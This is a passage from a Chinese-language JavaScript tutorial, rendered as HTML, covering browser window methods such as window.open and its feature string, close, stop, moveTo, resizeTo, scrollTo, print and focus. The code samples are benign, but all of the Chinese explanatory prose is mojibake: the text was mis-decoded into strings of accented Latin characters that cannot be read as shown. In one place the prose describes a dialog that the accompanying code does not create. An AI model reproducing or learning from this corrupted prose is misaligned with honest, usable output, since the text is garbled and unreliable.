punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'somefile.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç ä¼šè®©æµè§ˆå™¨å¼¹å‡ºä¸€ä¸ªæ–°å»ºçª—å£ï¼Œç½‘å€æ˜¯å½“å‰åŸŸåä¸‹çš„<code>somefile.html</code>ã€‚</p> <p><code>open</code>æ–¹æ³•ä¸€å…±å¯ä»¥æ¥å—ä¸‰ä¸ªå‚æ•°ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> windowName<span class="token punctuation">,</span> <span class="token punctuation">[</span>windowFeatures<span class="token punctuation">]</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ul><li><code>url</code>ï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ–°çª—å£çš„ç½‘å€ã€‚å¦‚æœçœç•¥ï¼Œé»˜è®¤ç½‘å€å°±æ˜¯<code>about:blank</code>ã€‚</li> <li><code>windowName</code>ï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ–°çª—å£çš„åå­—ã€‚å¦‚æœè¯¥åå­—çš„çª—å£å·²ç»å­˜åœ¨ï¼Œåˆ™å ç”¨è¯¥çª—å£ï¼Œä¸å†æ–°å»ºçª—å£ã€‚å¦‚æœçœç•¥ï¼Œå°±é»˜è®¤ä½¿ç”¨<code>_blank</code>ï¼Œè¡¨ç¤ºæ–°å»ºä¸€ä¸ªæ²¡æœ‰åå­—çš„çª—å£ã€‚å¦å¤–è¿˜æœ‰å‡ ä¸ªé¢„è®¾å€¼ï¼Œ<code>_self</code>è¡¨ç¤ºå½“å‰çª—å£ï¼Œ<code>_top</code>è¡¨ç¤ºé¡¶å±‚çª—å£ï¼Œ<code>_parent</code>è¡¨ç¤ºä¸Šä¸€å±‚çª—å£ã€‚</li> <li><code>windowFeatures</code>ï¼šå­—ç¬¦ä¸²ï¼Œå†…å®¹ä¸ºé€—å·åˆ†éš”çš„é”®å€¼å¯¹ï¼ˆè¯¦è§ä¸‹æ–‡ï¼‰ï¼Œè¡¨ç¤ºæ–°çª—å£çš„å‚æ•°ï¼Œæ¯”å¦‚æœ‰æ²¡æœ‰æç¤ºæ ã€å·¥å…·æ¡ç­‰ç­‰ã€‚å¦‚æœçœç•¥ï¼Œåˆ™é»˜è®¤æ‰“å¼€ä¸€ä¸ªå®Œæ•´ UI çš„æ–°çª—å£ã€‚å¦‚æœæ–°å»ºçš„æ˜¯ä¸€ä¸ªå·²ç»å­˜åœ¨çš„çª—å£ï¼Œåˆ™è¯¥å‚æ•°ä¸èµ·ä½œç”¨ï¼Œæµè§ˆå™¨æ²¿ç”¨ä»¥å‰çª—å£çš„å‚æ•°ã€‚</li></ul> <p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> popup <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>
  <span class="token string">'somepage.html'</span><span class="token punctuation">,</span>
  <span class="token string">'DefinitionsWindows'</span><span class="token punctuation">,</span>
  <span class="token string">'height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes'</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>ä¸Šé¢ä»£ç è¡¨ç¤ºï¼Œæ‰“å¼€çš„æ–°çª—å£é«˜åº¦å’Œå®½åº¦éƒ½ä¸º200åƒç´ ï¼Œæ²¡æœ‰åœ°å€æ ï¼Œä½†æœ‰çŠ¶æ€æ å’Œæ»šåŠ¨æ¡ï¼Œå…è®¸ç”¨æˆ·è°ƒæ•´å¤§å°ã€‚</p> <p>ç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥è®¾å®šå¦‚ä¸‹å±æ€§ã€‚</p> <ul><li>leftï¼šæ–°çª—å£è·ç¦»å±å¹•æœ€å·¦è¾¹çš„è·ç¦»ï¼ˆå•ä½åƒç´ ï¼‰ã€‚æ³¨æ„ï¼Œæ–°çª—å£å¿…é¡»æ˜¯å¯è§çš„ï¼Œä¸èƒ½è®¾ç½®åœ¨å±å¹•ä»¥å¤–çš„ä½ç½®ã€‚</li> <li>topï¼šæ–°çª—å£è·ç¦»å±å¹•æœ€é¡¶éƒ¨çš„è·ç¦»ï¼ˆå•ä½åƒç´ ï¼‰ã€‚</li> <li>heightï¼šæ–°çª—å£å†…å®¹åŒºåŸŸçš„é«˜åº¦ï¼ˆå•ä½åƒç´ ï¼‰ï¼Œä¸å¾—å°äº100ã€‚</li> <li>widthï¼šæ–°çª—å£å†…å®¹åŒºåŸŸçš„å®½åº¦ï¼ˆå•ä½åƒç´ ï¼‰ï¼Œä¸å¾—å°äº100ã€‚</li> <li>outerHeightï¼šæ•´ä¸ªæµè§ˆå™¨çª—å£çš„é«˜åº¦ï¼ˆå•ä½åƒç´ ï¼‰ï¼Œä¸å¾—å°äº100ã€‚</li> <li>outerWidthï¼šæ•´ä¸ªæµè§ˆå™¨çª—å£çš„å®½åº¦ï¼ˆå•ä½åƒç´ ï¼‰ï¼Œä¸å¾—å°äº100ã€‚</li> <li>menubarï¼šæ˜¯å¦æ˜¾ç¤ºèœå•æ ã€‚</li> <li>toolbarï¼šæ˜¯å¦æ˜¾ç¤ºå·¥å…·æ ã€‚</li> <li>locationï¼šæ˜¯å¦æ˜¾ç¤ºåœ°å€æ ã€‚</li> <li>personalbarï¼šæ˜¯å¦æ˜¾ç¤ºç”¨æˆ·è‡ªå·±å®‰è£…çš„å·¥å…·æ ã€‚</li> <li>statusï¼šæ˜¯å¦æ˜¾ç¤ºçŠ¶æ€æ ã€‚</li> <li>dependentï¼šæ˜¯å¦ä¾èµ–çˆ¶çª—å£ã€‚å¦‚æœä¾èµ–ï¼Œé‚£ä¹ˆçˆ¶çª—å£æœ€å°åŒ–ï¼Œè¯¥çª—å£ä¹Ÿæœ€å°åŒ–ï¼›çˆ¶çª—å£å…³é—­ï¼Œè¯¥çª—å£ä¹Ÿå…³é—­ã€‚</li> <li>minimizableï¼šæ˜¯å¦æœ‰æœ€å°åŒ–æŒ‰é’®ï¼Œå‰ææ˜¯<code>dialog=yes</code>ã€‚</li> <li>noopenerï¼šæ–°çª—å£å°†ä¸çˆ¶çª—å£åˆ‡æ–­è”ç³»ï¼Œå³æ–°çª—å£çš„<code>window.opener</code>å±æ€§è¿”å›<code>null</code>ï¼Œçˆ¶çª—å£çš„<code>window.open()</code>æ–¹æ³•ä¹Ÿè¿”å›<code>null</code>ã€‚</li> <li>resizableï¼šæ–°çª—å£æ˜¯å¦å¯ä»¥è°ƒèŠ‚å¤§å°ã€‚</li> <li>scrollbarsï¼šæ˜¯å¦å…è®¸æ–°çª—å£å‡ºç°æ»šåŠ¨æ¡ã€‚</li> <li>dialogï¼šæ–°çª—å£æ ‡é¢˜æ æ˜¯å¦å‡ºç°æœ€å¤§åŒ–ã€æœ€å°åŒ–ã€æ¢å¤åŸå§‹å¤§å°çš„æ§ä»¶ã€‚</li> <li>titlebarï¼šæ–°çª—å£æ˜¯å¦æ˜¾ç¤ºæ ‡é¢˜æ ã€‚</li> <li>alwaysRaisedï¼šæ˜¯å¦æ˜¾ç¤ºåœ¨æ‰€æœ‰çª—å£çš„é¡¶éƒ¨ã€‚</li> <li>alwaysLoweredï¼šæ˜¯å¦æ˜¾ç¤ºåœ¨çˆ¶çª—å£çš„åº•ä¸‹ã€‚</li> <li>closeï¼šæ–°çª—å£æ˜¯å¦æ˜¾ç¤ºå…³é—­æŒ‰é’®ã€‚</li></ul> <p>å¯¹äºé‚£äº›å¯ä»¥æ‰“å¼€å’Œå…³é—­çš„å±æ€§ï¼Œè®¾ä¸º<code>yes</code>æˆ–<code>1</code>æˆ–ä¸è®¾ä»»ä½•å€¼å°±è¡¨ç¤ºæ‰“å¼€ï¼Œæ¯”å¦‚<code>status=yes</code>ã€<code>status=1</code>ã€<code>status</code>éƒ½ä¼šå¾—åˆ°åŒæ ·çš„ç»“æœã€‚å¦‚æœæƒ³è®¾ä¸ºå…³é—­ï¼Œä¸ç”¨å†™<code>no</code>ï¼Œè€Œæ˜¯ç›´æ¥çœç•¥è¿™ä¸ªå±æ€§å³å¯ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœåœ¨ç¬¬ä¸‰ä¸ªå‚æ•°ä¸­è®¾ç½®äº†ä¸€éƒ¨åˆ†å±æ€§ï¼Œå…¶ä»–æ²¡æœ‰è¢«è®¾ç½®çš„<code>yes/no</code>å±æ€§éƒ½ä¼šè¢«è®¾æˆ<code>no</code>ï¼Œåªæœ‰<code>titlebar</code>å’Œå…³é—­æŒ‰é’®é™¤å¤–ï¼ˆå®ƒä»¬çš„å€¼é»˜è®¤ä¸º<code>yes</code>ï¼‰ã€‚</p> <p>ä¸Šé¢è¿™äº›å±æ€§ï¼Œå±æ€§åä¸å±æ€§å€¼ä¹‹é—´ç”¨ç­‰å·è¿æ¥ï¼Œå±æ€§ä¸å±æ€§ä¹‹é—´ç”¨é€—å·åˆ†éš”ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token string">'height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes'</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>å¦å¤–ï¼Œ<code>open()</code>æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°è™½ç„¶å¯ä»¥æŒ‡å®šå·²ç»å­˜åœ¨çš„çª—å£ï¼Œä½†æ˜¯ä¸ç­‰äºå¯ä»¥ä»»æ„æ§åˆ¶å…¶ä»–çª—å£ã€‚ä¸ºäº†é˜²æ­¢è¢«ä¸ç›¸å¹²çš„çª—å£æ§åˆ¶ï¼Œæµè§ˆå™¨åªæœ‰åœ¨ä¸¤ä¸ªçª—å£åŒæºï¼Œæˆ–è€…ç›®æ ‡çª—å£è¢«å½“å‰ç½‘é¡µæ‰“å¼€çš„æƒ…å†µä¸‹ï¼Œæ‰å…è®¸<code>open</code>æ–¹æ³•æŒ‡å‘è¯¥çª—å£ã€‚</p> <p><code>window.open</code>æ–¹æ³•è¿”å›æ–°çª—å£çš„å¼•ç”¨ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> windowB <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'windowB.html'</span><span class="token punctuation">,</span> <span class="token string">'WindowB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
windowB<span class="token punctuation">.</span>window<span class="token punctuation">.</span>name <span class="token comment">// &quot;WindowB&quot;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>æ³¨æ„ï¼Œå¦‚æœæ–°çª—å£å’Œçˆ¶çª—å£ä¸æ˜¯åŒæºçš„ï¼ˆå³ä¸åœ¨åŒä¸€ä¸ªåŸŸï¼‰ï¼Œå®ƒä»¬å½¼æ­¤ä¸èƒ½è·å–å¯¹æ–¹çª—å£å¯¹è±¡çš„å†…éƒ¨å±æ€§ã€‚</p> <p>ä¸‹é¢æ˜¯å¦ä¸€ä¸ªä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> w <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'å·²ç»æ‰“å¼€æ–°çª—å£'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
w<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'http://example.com'</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä¸Šé¢ä»£ç å…ˆæ‰“å¼€ä¸€ä¸ªæ–°çª—å£ï¼Œç„¶ååœ¨è¯¥çª—å£å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œå†å°†ç½‘å€å¯¼å‘<code>example.com</code>ã€‚</p> <p>ç”±äº<code>open</code>è¿™ä¸ªæ–¹æ³•å¾ˆå®¹æ˜“è¢«æ»¥ç”¨ï¼Œè®¸å¤šæµè§ˆå™¨é»˜è®¤éƒ½ä¸å…è®¸è„šæœ¬è‡ªåŠ¨æ–°å»ºçª—å£ã€‚åªå…è®¸åœ¨ç”¨æˆ·ç‚¹å‡»é“¾æ¥æˆ–æŒ‰é’®æ—¶ï¼Œè„šæœ¬åšå‡ºååº”ï¼Œå¼¹å‡ºæ–°çª—å£ã€‚å› æ­¤ï¼Œæœ‰å¿…è¦æ£€æŸ¥ä¸€ä¸‹æ‰“å¼€æ–°çª—å£æ˜¯å¦æˆåŠŸã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> popup <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>popup <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// æ–°å»ºçª—å£å¤±è´¥</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><strong>ï¼ˆ2ï¼‰window.close()</strong></p> <p><code>window.close</code>æ–¹æ³•ç”¨äºå…³é—­å½“å‰çª—å£ï¼Œä¸€èˆ¬åªç”¨æ¥å…³é—­<code>window.open</code>æ–¹æ³•æ–°å»ºçš„çª—å£ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>popup<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>è¯¥æ–¹æ³•åªå¯¹é¡¶å±‚çª—å£æœ‰æ•ˆï¼Œ<code>iframe</code>æ¡†æ¶ä¹‹ä¸­çš„çª—å£ä½¿ç”¨è¯¥æ–¹æ³•æ— æ•ˆã€‚</p> <p><strong>ï¼ˆ3ï¼‰window.stop()</strong></p> <p><code>window.stop()</code>æ–¹æ³•å®Œå…¨ç­‰åŒäºå•å‡»æµè§ˆå™¨çš„åœæ­¢æŒ‰é’®ï¼Œä¼šåœæ­¢åŠ è½½å›¾åƒã€è§†é¢‘ç­‰æ­£åœ¨æˆ–ç­‰å¾…åŠ è½½çš„å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="window-moveto-ï¼Œwindow-moveby"><a href="#window-moveto-ï¼Œwindow-moveby" class="header-anchor">#</a> window.moveTo()ï¼Œwindow.moveBy()</h3> <p><code>window.moveTo()</code>æ–¹æ³•ç”¨äºç§»åŠ¨æµè§ˆå™¨çª—å£åˆ°æŒ‡å®šä½ç½®ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯çª—å£å·¦ä¸Šè§’è·ç¦»å±å¹•å·¦ä¸Šè§’çš„æ°´å¹³è·ç¦»å’Œå‚ç›´è·ç¦»ï¼Œå•ä½ä¸ºåƒç´ ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">moveTo</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç å°†çª—å£ç§»åŠ¨åˆ°å±å¹•<code>(100, 200)</code>çš„ä½ç½®ã€‚</p> <p><code>window.moveBy()</code>æ–¹æ³•å°†çª—å£ç§»åŠ¨åˆ°ä¸€ä¸ªç›¸å¯¹ä½ç½®ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯çª—å£å·¦ä¸Šè§’å‘å³ç§»åŠ¨çš„æ°´å¹³è·ç¦»å’Œå‘ä¸‹ç§»åŠ¨çš„å‚ç›´è·ç¦»ï¼Œå•ä½ä¸ºåƒç´ ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">moveBy</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç å°†çª—å£å‘å³ç§»åŠ¨25åƒç´ ã€å‘ä¸‹ç§»åŠ¨50åƒç´ ã€‚</p> <p>ä¸ºäº†é˜²æ­¢æœ‰äººæ»¥ç”¨è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œéšæ„ç§»åŠ¨ç”¨æˆ·çš„çª—å£ï¼Œç›®å‰åªæœ‰ä¸€ç§æƒ…å†µï¼Œæµè§ˆå™¨å…è®¸ç”¨è„šæœ¬ç§»åŠ¨çª—å£ï¼šè¯¥çª—å£æ˜¯ç”¨<code>window.open()</code>æ–¹æ³•æ–°å»ºçš„ï¼Œå¹¶ä¸”çª—å£é‡Œåªæœ‰å®ƒä¸€ä¸ª Tab é¡µã€‚é™¤æ­¤ä»¥å¤–çš„æƒ…å†µï¼Œä½¿ç”¨ä¸Šé¢ä¸¤ä¸ªæ–¹æ³•éƒ½æ˜¯æ— æ•ˆçš„ã€‚</p> <h3 id="window-resizeto-ï¼Œwindow-resizeby"><a href="#window-resizeto-ï¼Œwindow-resizeby" class="header-anchor">#</a> window.resizeTo()ï¼Œwindow.resizeBy()</h3> <p><code>window.resizeTo()</code>æ–¹æ³•ç”¨äºç¼©æ”¾çª—å£åˆ°æŒ‡å®šå¤§å°ã€‚</p> <p>å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯ç¼©æ”¾åçš„çª—å£å®½åº¦ï¼ˆ<code>outerWidth</code>å±æ€§ï¼ŒåŒ…å«æ»šåŠ¨æ¡ã€æ ‡é¢˜æ ç­‰ç­‰ï¼‰ï¼Œç¬¬äºŒä¸ªæ˜¯ç¼©æ”¾åçš„çª—å£é«˜åº¦ï¼ˆ<code>outerHeight</code>å±æ€§ï¼‰ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">resizeTo</span><span class="token punctuation">(</span>
  window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>availWidth <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span>
  window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>availHeight <span class="token operator">/</span> <span class="token number">2</span>
<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>ä¸Šé¢ä»£ç å°†å½“å‰çª—å£ç¼©æ”¾åˆ°ï¼Œå±å¹•å¯ç”¨åŒºåŸŸçš„ä¸€åŠå®½åº¦å’Œé«˜åº¦ã€‚</p> <p><code>window.resizeBy()</code>æ–¹æ³•ç”¨äºç¼©æ”¾çª—å£ã€‚å®ƒä¸<code>window.resizeTo()</code>çš„åŒºåˆ«æ˜¯ï¼Œå®ƒæŒ‰ç…§ç›¸å¯¹çš„é‡ç¼©æ”¾ï¼Œ<code>window.resizeTo()</code>éœ€è¦ç»™å‡ºç¼©æ”¾åçš„ç»å¯¹å¤§å°ã€‚</p> <p>å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ°´å¹³ç¼©æ”¾çš„é‡ï¼Œç¬¬äºŒä¸ªæ˜¯å‚ç›´ç¼©æ”¾çš„é‡ï¼Œå•ä½éƒ½æ˜¯åƒç´ ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">resizeBy</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">200</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢çš„ä»£ç å°†å½“å‰çª—å£çš„å®½åº¦å’Œé«˜åº¦ï¼Œéƒ½ç¼©å°200åƒç´ ã€‚</p> <h3 id="window-scrollto-ï¼Œwindow-scroll-ï¼Œwindow-scrollby"><a href="#window-scrollto-ï¼Œwindow-scroll-ï¼Œwindow-scrollby" class="header-anchor">#</a> window.scrollTo()ï¼Œwindow.scroll()ï¼Œwindow.scrollBy()</h3> <p><code>window.scrollTo</code>æ–¹æ³•ç”¨äºå°†æ–‡æ¡£æ»šåŠ¨åˆ°æŒ‡å®šä½ç½®ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œè¡¨ç¤ºæ»šåŠ¨åä½äºçª—å£å·¦ä¸Šè§’çš„é¡µé¢åæ ‡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">scrollTo</span><span class="token punctuation">(</span>x<span class="token operator">-</span>coord<span class="token punctuation">,</span> y<span class="token operator">-</span>coord<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>å®ƒä¹Ÿå¯ä»¥æ¥å—ä¸€ä¸ªé…ç½®å¯¹è±¡ä½œä¸ºå‚æ•°ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">scrollTo</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>é…ç½®å¯¹è±¡<code>options</code>æœ‰ä¸‰ä¸ªå±æ€§ã€‚</p> <ul><li><code>top</code>ï¼šæ»šåŠ¨åé¡µé¢å·¦ä¸Šè§’çš„å‚ç›´åæ ‡ï¼Œå³ y åæ ‡ã€‚</li> <li><code>left</code>ï¼šæ»šåŠ¨åé¡µé¢å·¦ä¸Šè§’çš„æ°´å¹³åæ ‡ï¼Œå³ x åæ ‡ã€‚</li> <li><code>behavior</code>ï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ»šåŠ¨çš„æ–¹å¼ï¼Œæœ‰ä¸‰ä¸ªå¯èƒ½å€¼ï¼ˆ<code>smooth</code>ã€<code>instant</code>ã€<code>auto</code>ï¼‰ï¼Œé»˜è®¤å€¼ä¸º<code>auto</code>ã€‚</li></ul> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">scrollTo</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  top<span class="token operator">:</span> <span class="token number">1000</span><span class="token punctuation">,</span>
  behavior<span class="token operator">:</span> <span class="token string">'smooth'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><code>window.scroll()</code>æ–¹æ³•æ˜¯<code>window.scrollTo()</code>æ–¹æ³•çš„åˆ«åã€‚</p> <p><code>window.scrollBy()</code>æ–¹æ³•ç”¨äºå°†ç½‘é¡µæ»šåŠ¨æŒ‡å®šè·ç¦»ï¼ˆå•ä½åƒç´ ï¼‰ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼šæ°´å¹³å‘å³æ»šåŠ¨çš„åƒç´ ï¼Œå‚ç›´å‘ä¸‹æ»šåŠ¨çš„åƒç´ ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">scrollBy</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç ç”¨äºå°†ç½‘é¡µå‘ä¸‹æ»šåŠ¨ä¸€å±ã€‚</p> <p>å¦‚æœä¸æ˜¯è¦æ»šåŠ¨æ•´ä¸ªæ–‡æ¡£ï¼Œè€Œæ˜¯è¦æ»šåŠ¨æŸä¸ªå…ƒç´ ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢ä¸‰ä¸ªå±æ€§å’Œæ–¹æ³•ã€‚</p> <ul><li>Element.scrollTop</li> <li>Element.scrollLeft</li> <li>Element.scrollIntoView()</li></ul> <h3 id="window-print"><a href="#window-print" class="header-anchor">#</a> window.print()</h3> <p><code>window.print</code>æ–¹æ³•ä¼šè·³å‡ºæ‰“å°å¯¹è¯æ¡†ï¼Œä¸ç”¨æˆ·ç‚¹å‡»èœå•é‡Œé¢çš„â€œæ‰“å°â€å‘½ä»¤æ•ˆæœç›¸åŒã€‚</p> <p>å¸¸è§çš„æ‰“å°æŒ‰é’®ä»£ç å¦‚ä¸‹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'printLink'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  window<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>éæ¡Œé¢è®¾å¤‡ï¼ˆæ¯”å¦‚æ‰‹æœºï¼‰å¯èƒ½æ²¡æœ‰æ‰“å°åŠŸèƒ½ï¼Œè¿™æ—¶å¯ä»¥è¿™æ ·åˆ¤æ–­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> window<span class="token punctuation">.</span>print <span class="token operator">===</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// æ”¯æŒæ‰“å°åŠŸèƒ½</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h3 id="window-focus-ï¼Œwindow-blur"><a href="#window-focus-ï¼Œwindow-blur" class="header-anchor">#</a> window.focus()ï¼Œwindow.blur()</h3> <p><code>window.focus()</code>æ–¹æ³•ä¼šæ¿€æ´»çª—å£ï¼Œä½¿å…¶è·å¾—ç„¦ç‚¹ï¼Œå‡ºç°åœ¨å…¶ä»–çª—å£çš„å‰é¢ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> popup <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'popup.html'</span><span class="token punctuation">,</span> <span class="token string">'Popup Window'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>popup <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>popup<span class="token punctuation">.</span>closed<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  popup<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

